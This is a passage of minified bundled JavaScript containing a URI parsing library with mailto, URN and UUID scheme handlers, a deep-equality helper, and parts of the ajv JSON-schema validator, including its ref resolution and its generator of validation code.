P.secure==="boolean")P.scheme=P.secure?"wss":"ws",P.secure=void 0;if(P.resourceName){var s=P.resourceName.split("?"),e=Z(s,2),I1=e[0],Q0=e[1];P.path=I1&&I1!=="/"?I1:void 0,P.query=Q0,P.resourceName=void 0}return P.fragment=void 0,P}},u7={scheme:"wss",domainHost:ZX.domainHost,parse:ZX.parse,serialize:ZX.serialize},i={},U1=!0,K1="[A-Za-z0-9\\-\\.\\_\\~"+(U1?"\\xA0-\\u200D\\u2010-\\u2029\\u202F-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF":"")+"]",O1="[0-9A-Fa-f]",c1=W(W("%[EFef]"+O1+"%"+O1+O1+"%"+O1+O1)+"|"+W("%[89A-Fa-f]"+O1+"%"+O1+O1)+"|"+W("%"+O1+O1)),x1="[A-Za-z0-9\\!\\$\\%\\'\\*\\+\\-\\^\\_\\`\\{\\|\\}\\~]",M0="[\\!\\$\\%\\'\\(\\)\\*\\+\\,\\-\\.0-9\\<\\>A-Z\\x5E-\\x7E]",S0=Y(M0,"[\\\"\\\\]"),V0="[\\!\\$\\'\\(\\)\\*\\+\\,\\;\\:\\@]",d0=new RegExp(K1,"g"),k0=new RegExp(c1,"g"),o0=new RegExp(Y("[^]",x1,"[\\.]","[\\\"]",S0),"g"),M9=new RegExp(Y("[^]",K1,V0),"g"),f9=M9;function g9(v){var P=X1(v);return!P.match(d0)?v:P}var d9={scheme:"mailto",parse:function v(P,h){var s=P,e=s.to=s.path?s.path.split(","):[];if(s.path=void 0,s.query){var I1=!1,Q0={},j0=s.query.split("&");for(var L0=0,g0=j0.length;L0<g0;++L0){var A0=j0[L0].split("=");switch(A0[0]){case"to":var h0=A0[1].split(",");for(var X9=0,x0=h0.length;X9<x0;++X9)e.push(h0[X9]);break;case"subject":s.subject=s0(A0[1],h);break;case"body":s.body=s0(A0[1],h);break;default:I1=!0,Q0[s0(A0[0],h)]=s0(A0[1],h);break}}if(I1)s.headers=Q0}s.query=void 0;for(var D0=0,y0=e.length;D0<y0;++D0){var E0=e[D0].split("@");if(E0[0]=s0(E0[0]),!h.unicodeSupport)try{E0[1]=b1.toASCII(s0(E0[1],h).toLowerCase())}catch(MX){s.error=s.error||"Email address's domain name can not be converted to ASCII via punycode: "+MX}else E0[1]=s0(E0[1],h).toLowerCase();e[D0]=E0.join("@")}return s},serialize:function v(P,h){var s=P,e=H(P.to);if(e){for(var I1=0,Q0=e.length;I1<Q0;++I1){var j0=String(e[I1]),L0=j0.lastIndexOf("@"),g0=j0.slice(0,L0).replace(k0,g9).replace(k0,G).replace(o0,g),A0=j0.slice(L0+1);try{A0=!h.iri?b1.toASCII(s0(A0,h).toLowerCase()):b1.toUnicode(A0)}catch(D0){s.error=s.error||"Email address's domain name can not be converted to "+(!h.iri?"ASCII":"Unicode")+" via punycode: "+D0}e[I1]=g0+"@"+A0}s.path=e.join(",")}var h0=P.headers=P.headers||{};if(P.subject)h0.subject=P.subject;if(P.body)h0.body=P.body;var X9=[];for(var x0 in h0)if(h0[x0]!==i[x0])X9.push(x0.replace(k0,g9).replace(k0,G).replace(M9,g)+"="+h0[x0].replace(k0,g9).replace(k0,G).replace(f9,g));if(X9.length)s.query=X9.join("&");return s}},O8=/^([^\:]+)\:(.*)/,K6={scheme:"urn",parse:function v(P,h){var s=P.path&&P.path.match(O8),e=P;if(s){var I1=h.scheme||e.scheme||"urn",Q0=s[1].toLowerCase(),j0=s[2],L0=I1+":"+(h.nid||Q0),g0=S1[L0];if(e.nid=Q0,e.nss=j0,e.path=void 0,g0)e=g0.parse(e,h)}else e.error=e.error||"URN can not be parsed.";return e},serialize:function v(P,h){var s=h.scheme||P.scheme||"urn",e=P.nid,I1=s+":"+(h.nid||e),Q0=S1[I1];if(Q0)P=Q0.serialize(P,h);var j0=P,L0=P.nss;return j0.path=(e||h.nid)+":"+L0,j0}},c7=/^[0-9A-Fa-f]{8}(?:\-[0-9A-Fa-f]{4}){3}\-[0-9A-Fa-f]{12}$/,w9={scheme:"urn:uuid",parse:function v(P,h){var s=P;if(s.uuid=s.nss,s.nss=void 0,!h.tolerant&&(!s.uuid||!s.uuid.match(c7)))s.error=s.error||"UUID is not valid.";return s},serialize:function v(P,h){var s=P;return s.nss=(P.uuid||"").toLowerCase(),s}};S1[D9.scheme]=D9,S1[x9.scheme]=x9,S1[ZX.scheme]=ZX,S1[u7.scheme]=u7,S1[d9.scheme]=d9,S1[K6.scheme]=K6,S1[w9.scheme]=w9,Q.SCHEMES=S1,Q.pctEncChar=g,Q.pctDecChars=X1,Q.parse=t,Q.removeDotSegments=J0,Q.serialize=W0,Q.resolveComponents=I0,Q.resolve=G9,Q.normalize=a0,Q.equal=e9,Q.escapeComponent=y8,Q.unescapeComponent=s0,Object.defineProperty(Q,"__esModule",{value:!0})})}),BH=Y0((X,J)=>{J.exports=function Q(Y,W){if(Y===W)return!0;if(Y&&W&&typeof Y=="object"&&typeof W=="object"){if(Y.constructor!==W.constructor)return!1;var z,G,H;if(Array.isArray(Y)){if(z=Y.length,z!=W.length)return!1;for(G=z;G--!==0;)if(!Q(Y[G],W[G]))return!1;return!0}if(Y.constructor===RegExp)return Y.source===W.source&&Y.flags===W.flags;if(Y.valueOf!==Object.prototype.valueOf)return Y.valueOf()===W.valueOf();if(Y.toString!==Object.prototype.toString)return Y.toString()===W.toString();if(H=Object.keys(Y),z=H.length,z!==Object.keys(W).length)return!1;for(G=z;G--!==0;)if(!Object.prototype.hasOwnProperty.call(W,H[G]))return!1;for(G=z;G--!==0;){var U=H[G];if(!Q(Y[U],W[U]))return!1}return!0}return Y!==Y&&W!==W}}),ix1=Y0((X,J)=>{J.exports=function Q(Y){var W=0,z=Y.length,G=0,H;while(G<z)if(W++,H=Y.charCodeAt(G++),H>=55296&&H<=56319&&G<z){if(H=Y.charCodeAt(G),(H&64512)==56320)G++}return W}}),w7=Y0((X,J)=>{J.exports={copy:Q,checkDataType:Y,checkDataTypes:W,coerceToTypes:G,toHash:H,getProperty:V,escapeQuotes:B,equal:BH(),ucs2length:ix1(),varOccurences:Z,varReplace:M,schemaHasRules:F,schemaHasRulesExcept:j,schemaUnknownRules:O,toQuotedString:N,getPathExpr:A,getPath:D,getData:T,unescapeFragment:E,unescapeJsonPointer:p,escapeFragment:y,escapeJsonPointer:a};function Q(f,m){m=m||{};for(var o in f)m[o]=f[o];return m}function Y(f,m,o,J1){var H1=J1?" !== ":" === ",d=J1?" || ":" && ",Q1=J1?"!":"",u=J1?"":"!";switch(f){case"null":return m+H1+"null";case"array":return Q1+"Array.isArray("+m+")";case"object":return"("+Q1+m+d+"typeof "+m+H1+'"object"'+d+u+"Array.isArray("+m+"))";case"integer":return"(typeof "+m+H1+'"number"'+d+u+"("+m+" % 1)"+d+m+H1+m+(o?d+Q1+"isFinite("+m+")":"")+")";case"number":return"(typeof "+m+H1+'"'+f+'"'+(o?d+Q1+"isFinite("+m+")":"")+")";default:return"typeof "+m+H1+'"'+f+'"'}}function W(f,m,o){switch(f.length){case 1:return Y(f[0],m,o,!0);default:var J1="",H1=H(f);if(H1.array&&H1.object)J1=H1.null?"(":"(!"+m+" || ",J1+="typeof "+m+' !== "object")',delete H1.null,delete H1.array,delete H1.object;if(H1.number)delete H1.integer;for(var d in H1)J1+=(J1?" && ":"")+Y(d,m,o,!0);return J1}}var z=H(["string","number","integer","boolean","null"]);function G(f,m){if(Array.isArray(m)){var o=[];for(var J1=0;J1<m.length;J1++){var H1=m[J1];if(z[H1])o[o.length]=H1;else if(f==="array"&&H1==="array")o[o.length]=H1}if(o.length)return o}else if(z[m])return[m];else if(f==="array"&&m==="array")return["array"]}function H(f){var m={};for(var o=0;o<f.length;o++)m[f[o]]=!0;return m}var U=/^[a-z$_][a-z$_0-9]*$/i,K=/'|\\/g;function V(f){return typeof f=="number"?"["+f+"]":U.test(f)?"."+f:"['"+B(f)+"']"}function B(f){return f.replace(K,"\\$&").replace(/\n/g,"\\n").replace(/\r/g,"\\r").replace(/\f/g,"\\f").replace(/\t/g,"\\t")}function Z(f,m){m+="[^0-9]";var o=f.match(new RegExp(m,"g"));return o?o.length:0}function M(f,m,o){return m+="([^0-9])",o=o.replace(/\$/g,"$$$$"),f.replace(new RegExp(m,"g"),o+"$1")}function F(f,m){if(typeof f=="boolean")return!f;for(var o in f)if(m[o])return!0}function j(f,m,o){if(typeof f=="boolean")return!f&&o!="not";for(var J1 in f)if(J1!=o&&m[J1])return!0}function O(f,m){if(typeof f=="boolean")return;for(var o in f)if(!m[o])return o}function N(f){return"'"+B(f)+"'"}function A(f,m,o,J1){var H1=o?"'/' + "+m+(J1?"":".replace(/~/g, '~0').replace(/\\//g, '~1')"):J1?"'[' + "+m+" + ']'":"'[\\'' + "+m+" + '\\']'";return k(f,H1)}function D(f,m,o){var J1=o?N("/"+a(m)):N(V(m));return k(f,J1)}var S=/^\/(?:[^~]|~0|~1)*$/,$=/^([0-9]+)(#|\/(?:[^~]|~0|~1)*)?$/;function T(f,m,o){var J1,H1,d,Q1;if(f==="")return"rootData";if(f[0]=="/"){if(!S.test(f))throw new Error("Invalid JSON-pointer: "+f);H1=f,d="rootData"}else{if(Q1=f.match($),!Q1)throw new Error("Invalid JSON-pointer: "+f);if(J1=+Q1[1],H1=Q1[2],H1=="#"){if(J1>=m)throw new Error("Cannot access property/index "+J1+" levels up, current level is "+m);return o[m-J1]}if(J1>m)throw new Error("Cannot access data "+J1+" levels up, current level is "+m);if(d="data"+(m-J1||""),!H1)return d}var u=d,z1=H1.split("/");for(var B1=0;B1<z1.length;B1++){var N1=z1[B1];if(N1)d+=V(p(N1)),u+=" && "+d}return u}function k(f,m){if(f=='""')return m;return(f+" + "+m).replace(/([^\\])' \+ '/g,"$1")}function E(f){return p(decodeURIComponent(f))}function y(f){return encodeURIComponent(a(f))}function a(f){return f.replace(/~/g,"~0").replace(/\//g,"~1")}function p(f){return f.replace(/~1/g,"/").replace(/~0/g,"~")}}),_N=Y0((X,J)=>{var Q=w7();J.exports=Y;function Y(W){Q.copy(W,this)}}),rx1=Y0((X,J)=>{var Q=J.exports=function(z,G,H){if(typeof G=="function")H=G,G={};H=G.cb||H;var U=typeof H=="function"?H:H.pre||function(){},K=H.post||function(){};Y(G,U,K,z,"",z)};Q.keywords={additionalItems:!0,items:!0,contains:!0,additionalProperties:!0,propertyNames:!0,not:!0},Q.arrayKeywords={items:!0,allOf:!0,anyOf:!0,oneOf:!0},Q.propsKeywords={definitions:!0,properties:!0,patternProperties:!0,dependencies:!0},Q.skipKeywords={default:!0,enum:!0,const:!0,required:!0,maximum:!0,minimum:!0,exclusiveMaximum:!0,exclusiveMinimum:!0,multipleOf:!0,maxLength:!0,minLength:!0,pattern:!0,format:!0,maxItems:!0,minItems:!0,uniqueItems:!0,maxProperties:!0,minProperties:!0};function Y(z,G,H,U,K,V,B,Z,M,F){if(U&&typeof U=="object"&&!Array.isArray(U)){G(U,K,V,B,Z,M,F);for(var j in U){var O=U[j];if(Array.isArray(O)){if(j in Q.arrayKeywords)for(var N=0;N<O.length;N++)Y(z,G,H,O[N],K+"/"+j+"/"+N,V,K,j,U,N)}else if(j in Q.propsKeywords){if(O&&typeof O=="object")for(var A in O)Y(z,G,H,O[A],K+"/"+j+"/"+W(A),V,K,j,U,A)}else if(j in Q.keywords||z.allKeys&&!(j in Q.skipKeywords))Y(z,G,H,O,K+"/"+j,V,K,j,U)}H(U,K,V,B,Z,M,F)}}function W(z){return z.replace(/~/g,"~0").replace(/\//g,"~1")}}),qH=Y0((X,J)=>{var Q=dx1(),Y=BH(),W=w7(),z=_N(),G=rx1();J.exports=H,H.normalizeId=D,H.fullPath=O,H.url=S,H.ids=$,H.inlineRef=M,H.schema=U;function H(T,k,E){var y=this._refs[E];if(typeof y=="string")if(this._refs[y])y=this._refs[y];else return H.call(this,T,k,y);if(y=y||this._schemas[E],y instanceof z)return M(y.schema,this._opts.inlineRefs)?y.schema:y.validate||this._compile(y);var a=U.call(this,k,E),p,f,m;if(a)p=a.schema,k=a.root,m=a.baseId;if(p instanceof z)f=p.validate||T.call(this,p.schema,k,void 0,m);else if(p!==void 0)f=M(p,this._opts.inlineRefs)?p:T.call(this,p,k,void 0,m);return f}function U(T,k){var E=Q.parse(k),y=N(E),a=O(this._getId(T.schema));if(Object.keys(T.schema).length===0||y!==a){var p=D(y),f=this._refs[p];if(typeof f=="string")return K.call(this,T,f,E);else if(f instanceof z){if(!f.validate)this._compile(f);T=f}else if(f=this._schemas[p],f instanceof z){if(!f.validate)this._compile(f);if(p==D(k))return{schema:f,root:T,baseId:a};T=f}else return;if(!T.schema)return;a=O(this._getId(T.schema))}return B.call(this,E,a,T.schema,T)}function K(T,k,E){var y=U.call(this,T,k);if(y){var{schema:a,baseId:p}=y;T=y.root;var f=this._getId(a);if(f)p=S(p,f);return B.call(this,E,p,a,T)}}var V=W.toHash(["properties","patternProperties","enum","dependencies","definitions"]);function B(T,k,E,y){if(T.fragment=T.fragment||"",T.fragment.slice(0,1)!="/")return;var a=T.fragment.split("/");for(var p=1;p<a.length;p++){var f=a[p];if(f){if(f=W.unescapeFragment(f),E=E[f],E===void 0)break;var m;if(!V[f]){if(m=this._getId(E),m)k=S(k,m);if(E.$ref){var o=S(k,E.$ref),J1=U.call(this,y,o);if(J1)E=J1.schema,y=J1.root,k=J1.baseId}}}}if(E!==void 0&&E!==y.schema)return{schema:E,root:y,baseId:k}}var Z=W.toHash(["type","format","pattern","maxLength","minLength","maxProperties","minProperties","maxItems","minItems","maximum","minimum","uniqueItems","multipleOf","required","enum"]);function M(T,k){if(k===!1)return!1;if(k===void 0||k===!0)return F(T);else if(k)return j(T)<=k}function F(T){var k;if(Array.isArray(T)){for(var E=0;E<T.length;E++)if(k=T[E],typeof k=="object"&&!F(k))return!1}else for(var y in T){if(y=="$ref")return!1;if(k=T[y],typeof k=="object"&&!F(k))return!1}return!0}function j(T){var k=0,E;if(Array.isArray(T))for(var y=0;y<T.length;y++){if(E=T[y],typeof E=="object")k+=j(E);if(k==1/0)return 1/0}else for(var a in T){if(a=="$ref")return 1/0;if(Z[a])k++;else{if(E=T[a],typeof E=="object")k+=j(E)+1;if(k==1/0)return 1/0}}return k}function O(T,k){if(k!==!1)T=D(T);var E=Q.parse(T);return N(E)}function N(T){return Q.serialize(T).split("#")[0]+"#"}var A=/#\/?$/;function D(T){return T?T.replace(A,""):""}function S(T,k){return k=D(k),Q.resolve(T,k)}function $(T){var k=D(this._getId(T)),E={"":k},y={"":O(k,!1)},a={},p=this;return G(T,{allKeys:!0},function(f,m,o,J1,H1,d,Q1){if(m==="")return;var u=p._getId(f),z1=E[J1],B1=y[J1]+"/"+H1;if(Q1!==void 0)B1+="/"+(typeof Q1=="number"?Q1:W.escapeFragment(Q1));if(typeof u=="string"){u=z1=D(z1?Q.resolve(z1,u):u);var N1=p._refs[u];if(typeof N1=="string")N1=p._refs[N1];if(N1&&N1.schema){if(!Y(f,N1.schema))throw new Error('id "'+u+'" resolves to more than one schema')}else if(u!=D(B1))if(u[0]=="#"){if(a[u]&&!Y(f,a[u]))throw new Error('id "'+u+'" resolves to more than one schema');a[u]=f}else p._refs[u]=B1}E[m]=z1,y[m]=B1}),a}}),ZH=Y0((X,J)=>{var Q=qH();J.exports={Validation:z(Y),MissingRef:z(W)};function Y(G){this.message="validation failed",this.errors=G,this.ajv=this.validation=!0}W.message=function(G,H){return"can't resolve reference "+H+" from id "+G};function W(G,H,U){this.message=U||W.message(G,H),this.missingRef=Q.url(G,H),this.missingSchema=Q.normalizeId(Q.fullPath(this.missingRef))}function z(G){return G.prototype=Object.create(Error.prototype),G.prototype.constructor=G,G}}),EN=Y0((X,J)=>{J.exports=function(Q,Y){if(!Y)Y={};if(typeof Y==="function")Y={cmp:Y};var W=typeof Y.cycles==="boolean"?Y.cycles:!1,z=Y.cmp&&function(H){return function(U){return function(K,V){var B={key:K,value:U[K]},Z={key:V,value:U[V]};return H(B,Z)}}}(Y.cmp),G=[];return function H(U){if(U&&U.toJSON&&typeof U.toJSON==="function")U=U.toJSON();if(U===void 0)return;if(typeof U=="number")return isFinite(U)?""+U:"null";if(typeof U!=="object")return JSON.stringify(U);var K,V;if(Array.isArray(U)){V="[";for(K=0;K<U.length;K++){if(K)V+=",";V+=H(U[K])||"null"}return V+"]"}if(U===null)return"null";if(G.indexOf(U)!==-1){if(W)return JSON.stringify("__cycle__");throw new TypeError("Converting circular structure to JSON")}var B=G.push(U)-1,Z=Object.keys(U).sort(z&&z(U));V="";for(K=0;K<Z.length;K++){var M=Z[K],F=H(U[M]);if(!F)continue;if(V)V+=",";V+=JSON.stringify(M)+":"+F}return G.splice(B,1),"{"+V+"}"}(Q)}}),$N=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G="",H=Y.schema.$async===!0,U=Y.util.schemaHasRulesExcept(Y.schema,Y.RULES.all,"$ref"),K=Y.self._getId(Y.schema);if(Y.opts.strictKeywords){var V=Y.util.schemaUnknownRules(Y.schema,Y.RULES.keywords);if(V){var B="unknown keyword: "+V;if(Y.opts.strictKeywords==="log")Y.logger.warn(B);else throw new Error(B)}}if(Y.isTop){if(G+=" var validate = ",H)Y.async=!0,G+="async ";if(G+="function(data, dataPath, parentData, parentDataProperty, rootData) { 'use strict'; ",K&&(Y.opts.sourceCode||Y.opts.processCode))G+=" "+("/*# sourceURL="+K+" */")+" "}if(typeof Y.schema=="boolean"||!(U||Y.schema.$ref)){var W="false schema",Z=Y.level,M=Y.dataLevel,F=Y.schema[W],j=Y.schemaPath+Y.util.getProperty(W),O=Y.errSchemaPath+"/"+W,k=!Y.opts.allErrors,a,N="data"+(M||""),T="valid"+Z;if(Y.schema===!1){if(Y.isTop)k=!0;else G+=" var "+T+" = false; ";var A=A||[];if(A.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: '"+(a||"false schema")+"' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(O)+" , params: {} ",Y.opts.messages!==!1)G+=" , message: 'boolean schema is false' ";if(Y.opts.verbose)G+=" , schema: false , parentSchema: validate.schema"+Y.schemaPath+" , data: "+N+" ";G+=" } "}else G+=" {} ";var D=G;if(G=A.pop(),!Y.compositeRule&&k)if(Y.async)G+=" throw new ValidationError(["+D+"]); ";else G+=" validate.errors = ["+D+"]; return false; ";else G+=" var err = "+D+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; "}else if(Y.isTop)if(H)G+=" return data; ";else G+=" validate.errors = null; return true; ";else G+=" var "+T+" = true; ";if(Y.isTop)G+=" }; return validate; ";return G}if(Y.isTop){var S=Y.isTop,Z=Y.level=0,M=Y.dataLevel=0,N="data";if(Y.rootId=Y.resolve.fullPath(Y.self._getId(Y.root.schema)),Y.baseId=Y.baseId||Y.rootId,delete Y.isTop,Y.dataPathArr=[""],Y.schema.default!==void 0&&Y.opts.useDefaults&&Y.opts.strictDefaults){var $="default is ignored in the schema root";if(Y.opts.strictDefaults==="log")Y.logger.warn($);else throw new Error($)}G+=" var vErrors = null; ",G+=" var errors = 0;     ",G+=" if (rootData === undefined) rootData = data; "}else{var{level:Z,dataLevel:M}=Y,N="data"+(M||"");if(K)Y.baseId=Y.resolve.url(Y.baseId,K);if(H&&!Y.async)throw new Error("async schema in sync schema");G+=" var errs_"+Z+" = errors;"}var T="valid"+Z,k=!Y.opts.allErrors,E="",y="",a,p=Y.schema.type,f=Array.isArray(p);if(p&&Y.opts.nullable&&Y.schema.nullable===!0){if(f){if(p.indexOf("null")==-1)p=p.concat("null")}else if(p!="null")p=[p,"null"],f=!0}if(f&&p.length==1)p=p[0],f=!1;if(Y.schema.$ref&&U){if(Y.opts.extendRefs=="fail")throw new Error('$ref: validation keywords used in schema at path "'+Y.errSchemaPath+'" (see option extendRefs)');else if(Y.opts.extendRefs!==!0)U=!1,Y.logger.warn('$ref: keywords ignored in schema at path "'+Y.errSchemaPath+'"')}if(Y.schema.$comment&&Y.opts.$comment)G+=" "+Y.RULES.all.$comment.code(Y,"$comment");if(p){if(Y.opts.coerceTypes)var m=Y.util.coerceToTypes(Y.opts.coerceTypes,p);var o=Y.RULES.types[p];if(m||f||o===!0||o&&!k1(o)){var j=Y.schemaPath+".type",O=Y.errSchemaPath+"/type",j=Y.schemaPath+".type",O=Y.errSchemaPath+"/type",J1=f?"checkDataTypes":"checkDataType";if(G+=" if ("+Y.util[J1](p,N,Y.opts.strictNumbers,!0)+") { ",m){var H1="dataType"+Z,d="coerced"+Z;if(G+=" var "+H1+" = typeof "+N+"; var "+d+" = undefined; ",Y.opts.coerceTypes=="array")G+=" if ("+H1+" == 'object' && Array.isArray("+N+") && "+N+".length == 1) { "+N+" = "+N+"[0]; "+H1+" = typeof "+N+"; if ("+Y.util.checkDataType(Y.schema.type,N,Y.opts.strictNumbers)+") "+d+" = "+N+"; } ";G+=" if ("+d+" !== undefined) ; ";var Q1=m;if(Q1){var u,z1=-1,B1=Q1.length-1;while(z1<B1)if(u=Q1[z1+=1],u=="string")G+=" else if ("+H1+" == 'number' || "+H1+" == 'boolean') "+d+" = '' + "+N+"; else if ("+N+" === null) "+d+" = ''; ";else if(u=="number"||u=="integer"){if(G+=" else if ("+H1+" == 'boolean' || "+N+" === null || ("+H1+" == 'string' && "+N+" && "+N+" == +"+N+" ",u=="integer")G+=" && !("+N+" % 1)";G+=")) "+d+" = +"+N+"; "}else if(u=="boolean")G+=" else if ("+N+" === 'false' || "+N+" === 0 || "+N+" === null) "+d+" = false; else if ("+N+" === 'true' || "+N+" === 1) "+d+" = true; ";else if(u=="null")G+=" else if ("+N+" === '' || "+N+" === 0 || "+N+" === false) "+d+" = null; ";else if(Y.opts.coerceTypes=="array"&&u=="array")G+=" else if ("+H1+" == 'string' || "+H1+" == 'number' || "+H1+" == 'boolean' || "+N+" == null) "+d+" = ["+N+"]; "}G+=" else {   ";var A=A||[];if(A.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: '"+(a||"type")+"' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(O)+" , params: { type: '",f)G+=""+p.join(",");else G+=""+p;if(G+="' } ",Y.opts.messages!==!1){if(G+=" , message: 'should be ",f)G+=""+p.join(",");else G+=""+p;G+="' "}if(Y.opts.verbose)G+=" , schema: validate.schema"+j+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+N+" ";G+=" } "}else G+=" {} ";var D=G;if(G=A.pop(),!Y.compositeRule&&k)if(Y.async)G+=" throw new ValidationError(["+D+"]); ";else G+=" validate.errors = ["+D+"]; return false; ";else G+=" var err = "+D+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";G+=" } if ("+d+" !== undefined) {  ";var N1=M?"data"+(M-1||""):"parentData",i1=M?Y.dataPathArr[M]:"parentDataProperty";if(G+=" "+N+" = "+d+"; ",!M)G+="if ("+N1+" !== undefined)";G+=" "+N1+"["+i1+"] = "+d+"; } "}else{var A=A||[];if(A.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: '"+(a||"type")+"' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(O)+" , params: { type: '",f)G+=""+p.join(",");else G+=""+p;if(G+="' } ",Y.opts.messages!==!1){if(G+=" , message: 'should be ",f)G+=""+p.join(",");else G+=""+p;G+="' "}if(Y.opts.verbose)G+=" , schema: validate.schema"+j+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+N+" ";G+=" } "}else G+=" {} ";var D=G;if(G=A.pop(),!Y.compositeRule&&k)if(Y.async)G+=" throw new ValidationError(["+D+"]); ";else G+=" validate.errors = ["+D+"]; return false; ";else G+=" var err = "+D+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; "}G+=" } "}}if(Y.schema.$ref&&!U){if(G+=" "+Y.RULES.all.$ref.code(Y,"$ref")+" ",k){if(G+=" } if (errors === ",S)G+="0";else G+="errs_"+Z;G+=") { ",y+="}"}}else{var d1=Y.RULES;if(d1){var o,X0=-1,b1=d1.length-1;while(X0<b1)if(o=d1[X0+=1],k1(o)){if(o.type)G+=" if ("+Y.util.checkDataType(o.type,N,Y.opts.strictNumbers)+") { ";if(Y.opts.useDefaults){if(o.type=="object"&&Y.schema.properties){var F=Y.schema.properties,S1=Object.keys(F),g=S1;if(g){var X1,V1=-1,n=g.length-1;while(V1<n){X1=g[V1+=1];var r=F[X1];if(r.default!==void 0){var G1=N+Y.util.getProperty(X1);if(Y.compositeRule){if(Y.opts.strictDefaults){var $="default is ignored for: "+G1;if(Y.opts.strictDefaults==="log")Y.logger.warn($);else throw new Error($)}}else{if(G+=" if ("+G1+" === undefined ",Y.opts.useDefaults=="empty")G+=" || "+G1+" === null || "+G1+" === '' ";if(G+=" ) "+G1+" = ",Y.opts.useDefaults=="shared")G+=" "+Y.useDefault(r.default)+" ";else G+=" "+JSON.stringify(r.default)+" ";G+="; "}}}}}else if(o.type=="array"&&Array.isArray(Y.schema.items)){var $1=Y.schema.items;if($1){var r,z1=-1,m1=$1.length-1;while(z1<m1)if(r=$1[z1+=1],r.default!==void 0){var G1=N+"["+z1+"]";if(Y.compositeRule){if(Y.opts.strictDefaults){var $="default is ignored for: "+G1;if(Y.opts.strictDefaults==="log")Y.logger.warn($);else throw new Error($)}}else{if(G+=" if ("+G1+" === undefined ",Y.opts.useDefaults=="empty")G+=" || "+G1+" === null || "+G1+" === '' ";if(G+=" ) "+G1+" = ",Y.opts.useDefaults=="shared")G+=" "+Y.useDefault(r.default)+" ";else G+=" "+JSON.stringify(r.default)+" ";G+="; "}}}}}var t=o.rules;if(t){var Y1,Z1=-1,M1=t.length-1;while(Z1<M1)if(Y1=t[Z1+=1],J0(Y1)){var g1=Y1.code(Y,Y1.keyword,o.type);if(g1){if(G+=" "+g1+" ",k)E+="}"}}}if(k)G+=" "+E+" ",E="";if(o.type){if(G+=" } ",p&&p===o.type&&!m){G+=" else { ";var j=Y.schemaPath+".type",O=Y.errSchemaPath+"/type",A=A||[];if(A.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: '"+(a||"type")+"' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(O)+" , params: { type: '",f)G+=""+p.join(",");else G+=""+p;if(G+="' } ",Y.opts.messages!==!1){if(G+=" , message: 'should be ",f)G+=""+p.join(",");else G+=""+p;G+="' "}if(Y.opts.verbose)G+=" , schema: validate.schema"+j+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+N+" ";G+=" } "}else G+=" {} ";var D=G;if(G=A.pop(),!Y.compositeRule&&k)if(Y.async)G+=" throw new ValidationError(["+D+"]); ";else G+=" validate.errors = ["+D+"]; return false; ";else G+=" var err = "+D+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";G+=" } "}}if(k){if(G+=" if (errors === ",S)G+="0";else G+="errs_"+Z;G+=") { ",y+="}"}}}}if(k)G+=" "+y+" ";if(S){if(H)G+=" if (errors === 0) return data;           ",G+=" else throw new ValidationError(vErrors); ";else G+=" validate.errors = vErrors; ",G+=" return errors === 0;       ";G+=" }; return validate;"}else G+=" var "+T+" = errors === errs_"+Z+";";function k1(I0){var G9=I0.rules;for(var a0=0;a0<G9.length;a0++)if(J0(G9[a0]))return!0}function J0(I0){return Y.schema[I0.keyword]!==void 0||I0.implements&&W0(I0)}function W0(I0){var G9=I0.implements;for(var a0=0;a0<G9.length;a0++)if(Y.schema[G9[a0]]!==void 0)return!0}return G}}),nx1=Y0((X,J)=>{var Q=qH(),Y=w7(),W=ZH(),z=EN(),G=$N(),H=Y.ucs2length,U=BH(),K=W.Validation;J.exports=V;function V(D,S,$,T){var k=this,E=this._opts,y=[void 0],a={},p=[],f={},m=[],o={},J1=[];S=S||{schema:D,refVal:y,refs:a};var H1=B.call(this,D,S,T),d=this._compilations[H1.index];if(H1.compiling)return d.callValidate=N1;var Q1=this._formats,u=this.RULES;try{var z1=i1(D,S,$,T);d.validate=z1;var B1=d.callValidate;if(B1){if(B1.schema=z1.schema,B1.errors=null,B1.refs=z1.refs,B1.refVal=z1.refVal,B1.root=z1.root,B1.$async=z1.$async,E.sourceCode)B1.source=z1.source}return z1}finally{Z.call(this,D,S,T)}function N1(){var r=d.validate,G1=r.apply(this,arguments);return N1.errors=r.errors,G1}function i1(r,G1,$1,m1){var t=!G1||G1&&G1.schema==r;if(G1.schema!=S.schema)return V.call(k,r,G1,$1,m1);var Y1=r.$async===!0,Z1=G({isTop:!0,schema:r,isRoot:t,baseId:m1,root:G1,schemaPath:"",errSchemaPath:"#",errorPath:'""',MissingRefError:W.MissingRef,RULES:u,validate:G,util:Y,resolve:Q,resolveRef:d1,usePattern:X1,useDefault:V1,useCustomRule:n,opts:E,formats:Q1,logger:k.logger,self:k});if(Z1=A(y,O)+A(p,F)+A(m,j)+A(J1,N)+Z1,E.processCode)Z1=E.processCode(Z1,r);var M1;try{var g1=new Function("self","RULES","formats","root","refVal","defaults","customRules","equal","ucs2length","ValidationError",Z1);M1=g1(k,u,Q1,S,y,m,J1,U,H,K),y[0]=M1}catch(k1){throw k.logger.error("Error compiling schema, function code:",Z1),k1}if(M1.schema=r,M1.errors=null,M1.refs=a,M1.refVal=y,M1.root=t?M1:G1,Y1)M1.$async=!0;if(E.sourceCode===!0)M1.source={code:Z1,patterns:p,defaults:m};return M1}function d1(r,G1,$1){G1=Q.url(r,G1);var m1=a[G1],t,Y1;if(m1!==void 0)return t=y[m1],Y1="refVal["+m1+"]",g(t,Y1);if(!$1&&S.refs){var Z1=S.refs[G1];if(Z1!==void 0)return t=S.refVal[Z1],Y1=X0(G1,t),g(t,Y1)}Y1=X0(G1);var 